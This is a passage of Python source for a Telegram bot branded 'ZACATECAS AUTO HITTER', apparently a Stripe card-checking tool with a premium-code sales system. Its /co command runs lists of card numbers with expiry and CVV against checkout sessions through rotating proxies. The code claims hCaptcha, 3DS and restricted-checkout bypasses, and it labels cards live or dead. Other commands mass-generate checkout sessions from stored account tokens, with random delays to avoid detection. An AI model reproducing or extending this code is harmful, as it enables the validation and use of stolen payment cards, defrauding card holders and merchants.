                await msg.answer("ERROR\nNo active tokens")
                return
            
            processing = await msg.answer(f"⚡ GRABBING {count} CHECKOUTS ⚡\n\nTokens: {len(tokens)} active\nTarget: {count} checkouts ($9.9 each)")
            
            all_results = []
            grabbed_urls = []
            
            for i in range(count):
                token_idx = i % len(tokens)
                token = tokens[token_idx]
                
                try:
                    await processing.edit_text(f"⚡ GRABBING {count} CHECKOUTS ⚡\n\nProgress: {i+1}/{count} ✅\nToken: #{token_idx + 1}\nAmount: $9.9 each")
                except:
                    pass
                
                # Gunakan API baru
                result = await InfiniteTalkAutoCheckout.grab_single_checkout_v2(token)
                
                if result.get("success"):
                    grabbed_urls.append(result["url"])
                    
                    success_msg = f"""<pre>✅ CHECKOUT #{i+1} ✅

💰 Amount: $9.9
🎯 Credits: 90
🔗 URL: {result['url'][:50]}...
📛 Session: {result.get('session_id', 'N/A')[:20]}...
⚡ Token: #{token_idx + 1}

🎯 Use: /co {result['url']} cards</pre>"""
                    
                    await msg.answer(success_msg)
                
                all_results.append(result)
                
                if i < count - 1:
                    delay = random.uniform(4, 8)
                    await asyncio.sleep(delay)
            
            success_count = len([r for r in all_results if r.get("success")])
            
            final_text = f"""<pre>🎯 GRAB COMPLETE 🎯

Requested: {count}
Success: {success_count} ✅
Failed: {count - success_count} ❌
Total: ${success_count * 9.9:.2f}
Tokens Used: {len(tokens)}

⚡ Ready to charge!</pre>"""
            
            await processing.edit_text(final_text)
            
            if len(grabbed_urls) <= 3:
                for url in grabbed_urls:
                    await msg.answer(url)
                    await asyncio.sleep(0.5)
                    
        except Exception as e:
            await msg.answer(f"❌ GRAB ERROR\n\n{str(e)[:100]}")
        return
    
    # ===== CHECK BALANCE =====
    elif command == "balance":
        user_tokens = get_user_infinitetalk_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("INFO\nNo tokens saved")
            return
        
        checking = await msg.answer("💰 Checking token balances...")
        
        balances = []
        
        for token_data in user_tokens:
            token = token_data.get("token", "")
            
            if not token:
                continue
            
            result = await InfiniteTalkAutoCheckout.check_token_balance(token)
            
            if result.get("success"):
                balances.append({
                    "email": result.get("email", "Unknown")[:25],
                    "balance": result.get("balance", 0),
                    "total": result.get("total_balance", 0),
                    "remaining": result.get("remaining", 0)
                })
        
        if not balances:
            await checking.edit_text("❌ No valid tokens found")
            return
        
        response = f"""<pre>💰 INFINITETALK BALANCES ({len(balances)}) 💰

Total Tokens: {len(user_tokens)}
Valid Tokens: {len(balances)} ✅"""
        
        total_balance = sum(b["balance"] for b in balances)
        total_remaining = sum(b["remaining"] for b in balances)
        
        response += f"\n\n📊 Totals:"
        response += f"\n• Balance: {total_balance}"
        response += f"\n• Remaining Credits: {total_remaining}"
        response += f"\n• Max Checkouts: {total_remaining // 90}"
        
        response += f"\n\n👤 Token Details:"
        for i, bal in enumerate(balances[:5], 1):
            response += f"\n{i}. {bal['email']}"
            response += f"\n   Balance: ${bal['balance']:.2f}"
            response += f"\n   Credits: {bal['remaining']}"
            response += f"\n   Checkouts: {bal['remaining'] // 90}\n"
        
        if len(balances) > 5:
            response += f"\n... and {len(balances) - 5} more"
        
        response += f"\n\n🎯 Grab: /itauto grab {min(10, total_remaining // 90)}</pre>"
        
        await checking.edit_text(response)
        return
    
    # ===== ADD TOKEN =====
    elif command == "add":
        if len(args) < 3:
            await msg.answer("ERROR\nUsage: /itauto add <token>")
            return
        
        token = args[2].strip()
        
        checking = await msg.answer("🔄 Validating token...")
        
        result = await InfiniteTalkAutoCheckout.check_token_balance(token)
        
        if result.get("success"):
            email = result.get("email", "")
            balance = result.get("balance", 0)
            remaining = result.get("remaining", 0)
            
            add_infinitetalk_token(user_id, token, email)
            
            response = f"""<pre>✅ TOKEN ADDED ✅

📧 Email: {email}
💰 Balance: ${balance:.2f}
🎯 Credits: {remaining}
👤 Nickname: {result.get('nickname', 'Unknown')}

🔐 Token validated
🎯 Ready to grab $9.9 checkouts!

/itauto grab 1</pre>"""
            
            await checking.edit_text(response)
        else:
            await checking.edit_text(f"❌ INVALID TOKEN\n\nError: {result.get('error', 'Token invalid')}")
        return
    
    # ===== LIST TOKENS =====
    elif command == "list":
        user_tokens = get_user_infinitetalk_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("INFO\nNo tokens saved")
            return
        
        response = f"📋 INFINITETALK TOKENS ({len(user_tokens)}) 📋\n\n"
        
        for idx, token_data in enumerate(user_tokens):
            email = token_data.get("email", "No email")[:25]
            added = datetime.fromisoformat(token_data.get("added_at", "")).strftime('%d/%m') if token_data.get("added_at") else "N/A"
            active = "✅" if token_data.get("active", True) else "❌"
            
            response += f"{idx}. {active} {email} (added: {added})\n"
        
        response += f"\n🎯 Use: /itauto grab <count>\n💰 Check balances: /itauto balance"
        
        await msg.answer(response)
        return
    
    # ===== AUTO ROTATE =====
    elif command == "rotate":
        user_tokens = get_user_infinitetalk_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("ERROR\nNo tokens available")
            return
        
        checking = await msg.answer("🔄 Starting auto rotate...")
        
        try:
            tokens = [t.get("token", "") for t in user_tokens if t.get("active", True)]
            
            if not tokens:
                await checking.edit_text("ERROR\nNo active tokens")
                return
            
            checkouts = []
            
            for idx, token in enumerate(tokens):
                # Cek balance dulu
                balance = await InfiniteTalkAutoCheckout.check_token_balance(token)
                
                if balance.get("success") and balance.get("remaining", 0) >= 90:
                    result = await InfiniteTalkAutoCheckout.grab_single_checkout_v2(token)
                    
                    if result.get("success"):
                        checkouts.append(result)
                        
                        response = f"""✅ AUTO GRABBED #{len(checkouts)} ✅

👤 Email: {balance.get('email', 'Unknown')[:20]}...
💰 Amount: $9.9
🎯 Credits Used: 90
🔗 URL: {result['url'][:40]}..."""
                        
                        await msg.answer(response)
                
                if idx < len(tokens) - 1:
                    await asyncio.sleep(random.uniform(5, 10))
            
            if checkouts:
                total = len(checkouts) * 9.9
                
                await checking.edit_text(f"""🎯 ROTATE COMPLETE 🎯

Tokens Checked: {len(tokens)}
Checkouts Grabbed: {len(checkouts)} ✅
Total Amount: ${total:.2f}

🔥 {len(checkouts)} checkouts ready!""")
                
                for checkout in checkouts[:2]:
                    await msg.answer(checkout['url'])
                    await asyncio.sleep(0.5)
            else:
                await checking.edit_text("❌ NO CHECKOUTS GRABBED")
                
        except Exception as e:
            await checking.edit_text(f"❌ ROTATE ERROR\n\n{str(e)[:100]}")
        return
    
    else:
        await msg.answer(f"ERROR\nUnknown command: {command}\n\nUse /itauto for menu")

# ========== HOT COMMAND HANDLER ==========

@router.message(Command("hot"))
async def hot_command(msg: Message, command: CommandObject):
    """Generate Hotpot $10 checkout - SIMPLE VERSION"""
    if not check_access(msg):
        await msg.answer(format_html_pre("[ ACCESS DENIED ]"), parse_mode="HTML")
        return
    
    args = command.args
    
    if not args:
        response = """🔥 HOTPOT $10 CHECKOUT 🔥

Usage: /hot <jumlah>

Contoh:
/hot 1    → 1 checkout $10
/hot 3    → 3 checkout $10
/hot 10   → MAX 10 checkout

💰 Fixed: $10.00
🎯 Product: AI Image Generator - 100 Credits

⚡ Auto generate, langsung bisa charge!"""
        
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    try:
        count = int(args.strip())
        
        # MAX 10 saja
        if count > 10:
            count = 10
            await msg.answer(format_html_pre("[ INFO ] Max 10 checkouts"), parse_mode="HTML")
        
        if count < 1:
            await msg.answer(format_html_pre("[ ERROR ] Min 1 checkout"), parse_mode="HTML")
            return
        
        # Loading
        loading = await msg.answer("🔄 Generating checkouts...")
        
        results = []
        for i in range(count):
            # Update progress
            try:
                await loading.edit_text(f"🔄 Generating {i+1}/{count}...")
            except:
                pass
            
            result = await HotpotCheckoutSimple.create_single_checkout()
            results.append(result)
            
            # Delay antara request
            if i < count - 1:
                await asyncio.sleep(1)
        
        # Count success
        success = [r for r in results if r.get("success")]
        failed = [r for r in results if not r.get("success")]
        
        # Response
        response = f"""🎯 HOTPOT CHECKOUT READY 🎯

Request: {count} checkouts
Success: {len(success)} ✅
Failed: {len(failed)} ❌
Amount: $10.00 each

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        if success:
            # Show first 3 URLs
            for i, result in enumerate(success[:3], 1):
                url = result.get("url", "")
                cs = result.get("cs", "")
                short_url = (url[:50] + "...") if len(url) > 50 else url
                
                response += f"\n{i}. {short_url}"
                response += f"\n   CS: {cs[:20]}...\n"
            
            if len(success) > 3:
                response += f"\n... and {len(success) - 3} more"
            
            # Contoh charge dengan URL pertama
            first_url = success[0].get("url")
            response += f"\n\n⚡ Charge example:\n"
            response += f"/co {first_url} 4012888888881881|12|28|123"
        
        if failed:
            response += f"\n\n⚠️ Failed: {len(failed)}"
        
        response += f"\n\n⏰ Generated: {datetime.now().strftime('%H:%M:%S')}"
        
        await loading.edit_text(format_html_pre(response), parse_mode="HTML")
        
        # Kirim URL lengkap jika hanya 1-2
        if len(success) <= 2:
            for result in success:
                url = result.get("url")
                await msg.answer(f"🔗 {url}")
                await asyncio.sleep(0.5)
                
    except ValueError:
        await msg.answer(format_html_pre("[ ERROR ]\nGunakan angka: /hot 1 sampai 10"), parse_mode="HTML")

# ========== NEW COMMAND HANDLERS ==========

@router.message(Command("gencode"))
async def gencode_handler(msg: Message):
    """Generate premium code"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    args = msg.text.split()
    if len(args) < 3:
        response = """[ GENERATE CODE ]
Usage: /gencode <days> <max_users>
Example: /gencode 1 10 (1 day, 10 users)
         /gencode 7 50 (7 days, 50 users)"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    try:
        days = int(args[1])
        max_users = int(args[2])
        
        if days <= 0 or max_users <= 0:
            await msg.answer(format_html_pre("[ ERROR ]\nDays and max users must be positive"), parse_mode="HTML")
            return
        
        code_data = CodeManager.add_code(days, max_users, msg.from_user.id)
        
        response = f"""✅ CODE GENERATED SUCCESSFULLY ✅

Code: {code_data['code']}
Duration: {days} days
Max Users: {max_users}
Created By: {msg.from_user.id}
Created At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📋 Copy code: {code_data['code']}
👥 Max users: {max_users} users
⏰ Expires in: {days} days

📢 Share this code with your users!"""
        
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        
    except ValueError:
        await msg.answer(format_html_pre("[ ERROR ]\nInvalid number format"), parse_mode="HTML")

@router.message(Command("redeem"))
async def redeem_handler(msg: Message):
    """Redeem premium code"""
    args = msg.text.split()
    if len(args) < 2:
        response = """[ REDEEM PREMIUM ]
Usage: /redeem <code>
Example: /redeem ZACATECAS-1d-ABCDEF123456"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    code = args[1].strip()
    result = CodeManager.redeem_code(msg.from_user.id, code)
    
    if result["success"]:
        response = f"""🎉 PREMIUM ACTIVATED 🎉

✅ Code redeemed successfully!
⏰ Duration: {result['message']}
📅 Expiry: {result['expiry_date'].strftime('%Y-%m-%d %H:%M:%S')}
👤 User ID: {msg.from_user.id}

🔥 Now you can use all premium features!
⚡ Use /co to start hitting!"""
    else:
        response = f"""❌ REDEEM FAILED ❌

{result['message']}

💡 Make sure:
1. Code is valid
2. Code not expired
3. Code not reached max users
4. You haven't used this code before"""
    
    await msg.answer(format_html_pre(response), parse_mode="HTML")

@router.message(Command("codes"))
async def codes_handler(msg: Message):
    """Show active codes"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    codes = CodeManager.get_active_codes()
    
    if not codes:
        response = "[ NO ACTIVE CODES ]\nNo active codes found"
    else:
        response = f"""📋 ACTIVE CODES ({len(codes)}) 📋"""
        
        for code, data in codes.items():
            used_count = len(data.get("used_by", []))
            max_users = data.get("max_users", 0)
            days = data.get("duration_days", 0)
            created = datetime.fromisoformat(data.get("created_at", "")).strftime('%Y-%m-%d')
            
            response += f"\n\nCode: {code}"
            response += f"\nDuration: {days} days"
            response += f"\nUsers: {used_count}/{max_users}"
            response += f"\nCreated: {created}"
            response += f"\nStatus: {'ACTIVE' if data.get('active', False) else 'INACTIVE'}"
    
    await msg.answer(format_html_pre(response), parse_mode="HTML")

@router.message(Command("listusers"))
async def listusers_handler(msg: Message):
    """List all premium users"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    users = CodeManager.get_all_users()
    
    if not users:
        response = "[ NO PREMIUM USERS ]\nNo premium users found"
    else:
        response = f"""👥 PREMIUM USERS ({len(users)}) 👥"""
        
        for user_id, user_data in list(users.items())[:20]:  # Limit to 20 users
            premium = user_data.get("premium", False)
            unlimited = user_data.get("unlimited", False)
            expiry = user_data.get("expiry_date", "N/A")
            
            if unlimited:
                status = "UNLIMITED ✅"
            elif premium:
                try:
                    exp_date = datetime.fromisoformat(expiry)
                    if datetime.now() > exp_date:
                        status = "EXPIRED ❌"
                    else:
                        days_left = (exp_date - datetime.now()).days
                        status = f"ACTIVE ({days_left} days left)"
                except:
                    status = "ACTIVE ⚡"
            else:
                status = "INACTIVE ❌"
            
            response += f"\n\nUser ID: {user_id}"
            response += f"\nStatus: {status}"
            response += f"\nType: {'Unlimited' if unlimited else 'Premium'}"
        
        if len(users) > 20:
            response += f"\n\n... and {len(users) - 20} more users"
    
    await msg.answer(format_html_pre(response), parse_mode="HTML")

@router.message(Command("addu"))
async def addu_handler(msg: Message):
    """Add unlimited premium user"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    args = msg.text.split()
    if len(args) < 2:
        response = """[ ADD UNLIMITED USER ]
Usage: /addu <user_id>
Example: /addu 1234567890"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    try:
        user_id = int(args[1])
        success = CodeManager.add_unlimited_user(user_id, msg.from_user.id)
        
        if success:
            response = f"""✅ UNLIMITED USER ADDED ✅

User ID: {user_id}
Status: UNLIMITED PREMIUM
Added By: {msg.from_user.id}
Added At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔥 User now has unlimited access!
⚡ No expiry date"""
        else:
            response = "[ ERROR ]\nFailed to add user"
        
        await msg.answer(format_html_pre(response), parse_mode="HTML")
    except ValueError:
        await msg.answer(format_html_pre("[ ERROR ]\nInvalid user ID"), parse_mode="HTML")

@router.message(Command("delu"))
async def delu_handler(msg: Message):
    """Delete premium user"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    args = msg.text.split()
    if len(args) < 2:
        response = """[ DELETE PREMIUM USER ]
Usage: /delu <user_id>
Example: /delu 1234567890"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    try:
        user_id = int(args[1])
        success = CodeManager.remove_premium_user(user_id)
        
        if success:
            response = f"""🗑️ PREMIUM USER REMOVED 🗑️

User ID: {user_id}
Status: PREMIUM REMOVED
Removed By: {msg.from_user.id}
Removed At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ User premium access has been removed"""
        else:
            response = "[ ERROR ]\nUser not found or not premium"
        
        await msg.answer(format_html_pre(response), parse_mode="HTML")
    except ValueError:
        await msg.answer(format_html_pre("[ ERROR ]\nInvalid user ID"), parse_mode="HTML")

@router.message(Command("delcode"))
async def delcode_handler(msg: Message):
    """Delete premium code"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nOwner only command"), parse_mode="HTML")
        return
    
    args = msg.text.split()
    if len(args) < 2:
        response = """[ DELETE CODE ]
Usage: /delcode <code>
Example: /delcode ZACATECAS-1d-ABCDEF123456"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    code = args[1].strip()
    success = CodeManager.delete_code(code)
    
    if success:
        response = f"""🗑️ CODE DELETED 🗑️

Code: {code}
Status: DELETED
Deleted By: {msg.from_user.id}
Deleted At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ Code has been permanently deleted
❌ No longer redeemable"""
    else:
        response = "[ ERROR ]\nCode not found"
    
    await msg.answer(format_html_pre(response), parse_mode="HTML")

@router.message(Command("mystatus"))
async def mystatus_handler(msg: Message):
    """Check user premium status"""
    user_id = msg.from_user.id
    premium_status = CodeManager.get_user_premium_status(user_id)
    
    if premium_status["premium"]:
        if premium_status["unlimited"]:
            response = f"""⭐ YOUR PREMIUM STATUS ⭐

User ID: {user_id}
Status: UNLIMITED PREMIUM ✅
Expiry: NEVER ❤️
Access: FULL FEATURES

🔥 You have unlimited access!
⚡ Use /co to start hitting!"""
        else:
            expiry = premium_status["expiry_date"]
            if isinstance(expiry, datetime):
                days_left = (expiry - datetime.now()).days
                expiry_str = expiry.strftime('%Y-%m-%d %H:%M:%S')
                response = f"""⭐ YOUR PREMIUM STATUS ⭐

User ID: {user_id}
Status: PREMIUM ✅
Expiry: {expiry_str}
Days Left: {days_left} days
Access: FULL FEATURES

🔥 Premium active! Use /co to hit!
⏰ Expires in {days_left} days"""
            else:
                response = f"""⭐ YOUR PREMIUM STATUS ⭐

User ID: {user_id}
Status: PREMIUM ✅
Expiry: {expiry}
Access: FULL FEATURES"""
    else:
        response = f"""ℹ️ YOUR STATUS ℹ️

User ID: {user_id}
Status: FREE USER ⚠️
Access: LIMITED FEATURES

💡 Upgrade to premium for:
• Unlimited hitting
• No restrictions
• Priority support
• All features unlocked

📋 Redeem code: /redeem <code>"""
    
    await msg.answer(response, parse_mode=None)

# ========== EXISTING COMMAND HANDLERS ==========

@router.message(Command("start"))
async def start_handler(msg: Message):
    """Start command with user status"""
    user_id = msg.from_user.id
    premium_status = CodeManager.get_user_premium_status(user_id)
    
    status_icon = "⭐ PREMIUM USER" if premium_status["premium"] else "ℹ️ FREE USER"
    status_text = "UNLIMITED" if premium_status.get("unlimited") else f"{premium_status.get('expiry_date', 'FREE')}"
    
    response = f"""╔══════════════════════════════════════╗
║       ZACATECAS AUTO HITTER v4.0      ║
╠══════════════════════════════════════╣
║ User: {user_id:<26} ║
║ Status: {status_icon:<25} ║
║ Plan: {status_text:<28} ║
╠══════════════════════════════════════╣
║ 📋 MAIN COMMANDS:                    ║
║ /start - Show this menu              ║
║ /co - Stripe checkout hitter         ║
║ /hot - Hotpot $10 checkout generator ║
║ /addproxy - Add proxy                ║
║ /proxy - Check proxies               ║
║ /mystatus - Check your status        ║
║ /redeem - Redeem premium code        ║
╠══════════════════════════════════════╣
║ ⚡ FEATURES:                          ║
║ • Real-time per card results         ║
║ • Rotating proxy system              ║
║ • hCaptcha auto bypass               ║
║ • LIVE/DEAD detection                ║
║ • Premium code system                ║
║ • Unlimited users support            ║
║ • Hotpot checkout generator          ║
╠══════════════════════════════════════╣
║           By @ile_gal                ║
╚══════════════════════════════════════╝"""
    await msg.answer(format_html_pre(response), parse_mode="HTML")

@router.message(Command("addproxy"))
async def addproxy_handler(msg: Message):
    """Add proxy handler dengan premium check"""
    if not check_access(msg):
        premium_status = CodeManager.get_user_premium_status(msg.from_user.id)
        if not premium_status["premium"]:
            response = """[ PREMIUM REQUIRED ]

❌ This feature requires premium access!

💡 Upgrade to premium for:
• Add unlimited proxies
• Rotating proxy system
• No restrictions
• All features unlocked

📋 Redeem code: /redeem <code>
👤 Check status: /mystatus"""
            await msg.answer(format_html_pre(response), parse_mode="HTML")
            return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    user_proxies = get_user_proxies(user_id)
    
    if len(args) < 2:
        if user_proxies:
            proxy_list = "\n".join([f"• {p}" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n• ... and {len(user_proxies) - 10} more"
        else:
            proxy_list = "• None"
        
        response = f"""[ PROXY MANAGER ]
Your Proxies ({len(user_proxies)}):

{proxy_list}

Commands:
/addproxy proxy
/removeproxy proxy
/removeproxy all
/proxy check"""
        
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    proxy_input = args[1].strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
    
    if not proxies_to_add:
        await msg.answer(format_html_pre("[ ERROR ]\nNo valid proxies provided"), parse_mode="HTML")
        return
    
    checking_msg = await ZACATECASLoader.proxy_loading(msg, f"Checking {len(proxies_to_add)} proxies")
    
    results = await check_proxies_batch(proxies_to_add, max_threads=10)
    
    alive_proxies = []
    dead_proxies = []
    
    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)
    
    response = f"""[ PROXY CHECK ]
Alive: {len(alive_proxies)}/{len(proxies_to_add)} ✓
Dead: {len(dead_proxies)}/{len(proxies_to_add)} ✗"""
    
    if alive_proxies:
        response += "\n\nAdded:\n"
        for p in alive_proxies[:5]:
            response += f"• {p['proxy']} ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"• ... and {len(alive_proxies) - 5} more\n"
    
    await checking_msg.edit_text(format_html_pre(response), parse_mode="HTML")

@router.message(Command("removeproxy"))
async def removeproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nPremium access required"), parse_mode="HTML")
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2:
        response = """[ REMOVE PROXY ]
Usage: /removeproxy proxy
All: /removeproxy all"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    proxy_input = args[1].strip()
    
    if proxy_input.lower() == "all":
        user_proxies = get_user_proxies(user_id)
        count = len(user_proxies)
        remove_user_proxy(user_id, "all")
        await msg.answer(format_html_pre(f"[ ALL PROXIES REMOVED ]\nRemoved: {count} proxies"), parse_mode="HTML")
        return
    
    if remove_user_proxy(user_id, proxy_input):
        await msg.answer(format_html_pre(f"[ PROXY REMOVED ]\nProxy: {proxy_input}"), parse_mode="HTML")
    else:
        await msg.answer(format_html_pre("[ ERROR ]\nProxy not found"), parse_mode="HTML")

@router.message(Command("proxy"))
async def proxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nPremium access required"), parse_mode="HTML")
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2 or args[1].strip().lower() != "check":
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            proxy_list = "\n".join([f"• {p}" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n• ... and {len(user_proxies) - 10} more"
        else:
            proxy_list = "• None"
        
        response = f"""[ PROXY MANAGER ]
Your Proxies ({len(user_proxies)}):

{proxy_list}

Check all: /proxy check"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    user_proxies = get_user_proxies(user_id)
    
    if not user_proxies:
        await msg.answer(format_html_pre("[ ERROR ]\nNo proxies to check\nAdd: /addproxy proxy"), parse_mode="HTML")
        return
    
    checking_msg = await ZACATECASLoader.proxy_loading(msg, f"Checking {len(user_proxies)} proxies")
    
    results = await check_proxies_batch(user_proxies, max_threads=10)
    
    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]
    
    response = f"""[ PROXY CHECK RESULTS ]
Alive: {len(alive)}/{len(user_proxies)} ✓
Dead: {len(dead)}/{len(user_proxies)} ✗"""
    
    if alive:
        response += "\n\nAlive Proxies:\n"
        for p in alive[:5]:
            ip_display = p['external_ip'] or 'N/A'
            response += f"• {p['proxy']}\n  IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"• ... and {len(alive) - 5} more\n"
    
    if dead:
        response += "\nDead Proxies:\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"• {p['proxy']} ({error})\n"
        if len(dead) > 3:
            response += f"• ... and {len(dead) - 3} more\n"
    
    await checking_msg.edit_text(format_html_pre(response), parse_mode="HTML")

@router.message(Command("co"))
async def co_handler(msg: Message):
    """Main charging handler dengan rotating proxy"""
    if not check_access(msg):
        await msg.answer(format_html_pre("[ ACCESS DENIED ]\nPremium access required\nUse /mystatus to check"), parse_mode="HTML")
        return
    
    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)
    
    if len(first_line_args) < 2:
        response = """[ STRIPE CHECKOUT ]
Usage: /co url
Charge: /co url cc|mm|yy|cvv
Bypass: /co url yes/no cc|mm|yy|cvv
File: Reply to .txt with /co url"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    url = extract_checkout_url(first_line_args[1])
    if not url:
        url = first_line_args[1].strip()
    
    cards = []
    bypass_3ds = False
    
    if len(first_line_args) > 2:
        if first_line_args[2].lower() in ['yes', 'no']:
            bypass_3ds = first_line_args[2].lower() == 'yes'
            if len(first_line_args) > 3:
                cards = parse_cards(first_line_args[3])
        else:
            cards = parse_cards(first_line_args[2])
    
    if len(lines) > 1:
        remaining_text = '\n'.join(lines[1:])
        cards.extend(parse_cards(remaining_text))
    
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode('utf-8')
                cards = parse_cards(text_content)
            except Exception as e:
                await msg.answer(format_html_pre(f"[ ERROR ]\nFailed to read file: {str(e)}"), parse_mode="HTML")
                return
    
    # Check if user has proxies
    user_proxies = get_user_proxies(user_id)
    if not user_proxies:
        response = """[ NO PROXY ]
You must set a proxy first
Add: /addproxy host:port:user:pass"""
        await msg.answer(format_html_pre(response), parse_mode="HTML")
        return
    
    # Get premium status
    premium_status = CodeManager.get_user_premium_status(user_id)
    is_unlimited = premium_status.get("unlimited", False)
    
    processing_msg = await ZACATECASLoader.parsing_loading(msg, "Parsing checkout URL")
    
    checkout_data = await get_checkout_info(url)
    
    if checkout_data.get("error") and "restricted" in str(checkout_data.get("error", "")).lower():
        # Kirim info bahwa checkout restricted tapi bisa diproses
        restricted_info = f"""🔒 RESTRICTED CHECKOUT DETECTED 🔒

Merchant: {checkout_data.get('merchant', 'N/A')}
Status: RESTRICTED MODE ⚠️
Info: Checkout memiliki security ketat
Action: Using MULTI-APPROACH BYPASS SYSTEM

🔥 System akan otomatis coba 4 approach:
1. Direct API
2. Embedded Session  
3. Stripe Elements
4. Direct Confirm

⏳ Processing dengan advanced bypass..."""
        
        await msg.answer(format_html_pre(restricted_info), parse_mode="HTML")
    
    if checkout_data.get("error") and "restricted" not in str(checkout_data.get("error", "")).lower():
        await processing_msg.edit_text(format_html_pre(f"[ ERROR ]\n{checkout_data['error']}"), parse_mode="HTML")
        return
    
    if not cards:
        currency = checkout_data.get('currency', '')
        sym = get_currency_symbol(currency)
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
        total_time = round(time.perf_counter() - start_time, 2)
        
        response = f"""[ CHECKOUT INFO {price_str} ]
Proxy: ROTATING SYSTEM (Alive: {len([p for p in user_proxies if ':' in p])})
CS: {checkout_data['cs'] or 'N/A'}
PK: {checkout_data['pk'] or 'N/A'}

Merchant: {checkout_data['merchant'] or 'N/A'}
Product: {checkout_data['product'] or 'N/A'}
Country: {checkout_data['country'] or 'N/A'}
Mode: {checkout_data['mode'] or 'N/A'}

Customer: {checkout_data['customer_name'] or 'N/A'}
Email: {checkout_data['customer_email'] or 'N/A'}

Cards: {checkout_data['cards_accepted'] or 'CARD'}

Time: {total_time}s"""
        
        await processing_msg.edit_text(format_html_pre(response), parse_mode="HTML")
        return
    
    bypass_str = "YES" if bypass_3ds else "NO"
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
    
    # Variables untuk tracking
    charged = False
    session_expired = False
    results = []
    live_cards = []
    dead_cards = []
    threeds_cards = []
    error_cards = []
    incorrect_cvc_cards = []
    captcha_blocked_cards = []
    unsupported_cards = []  # Untuk UNSUPPORTED SURFACE
    used_proxies = []  # Track used proxies
    bypass_used_cards = []  # Track cards yang menggunakan bypass
    
    # Start charging dengan rotating proxy
    await processing_msg.edit_text(format_html_pre(f"⚡ CHARGING STARTED ⚡\n\nMerchant: {checkout_data['merchant'] or 'N/A'}\nAmount: {price_str}\nCards: {len(cards)}\nProxy: ROTATING SYSTEM\nStatus: Premium {'Unlimited' if is_unlimited else 'Active'}\n\nProcessing Card 1/{len(cards)}"), parse_mode="HTML")
    
    for i, card in enumerate(cards):
        if session_expired:
            break
        
        # Get rotating proxy untuk card ini
        current_proxy = RotatingProxyManager.get_rotating_proxy(user_id)
        if not current_proxy:
            await msg.answer(format_html_pre("[ ERROR ]\nNo alive proxies available\nAdd more proxies with /addproxy"), parse_mode="HTML")
            break
        
        used_proxies.append(current_proxy)
        proxy_ip = RotatingProxyManager.get_proxy_ip(current_proxy)
        
        # Update progress dengan proxy info
        progress_text = f"🔄 PROCESSING CARD {i+1}/{len(cards)}\n\nMerchant: {checkout_data['merchant'] or 'N/A'}\nAmount: {price_str}\nProxy: {proxy_ip}"
        try:
            await processing_msg.edit_text(format_html_pre(progress_text), parse_mode="HTML")
        except:
            pass
        
        # Check session every 3 cards
        if i > 0 and i % 3 == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                session_expired = True
                expired_msg = f"""⏳ SESSION EXPIRED ⏳

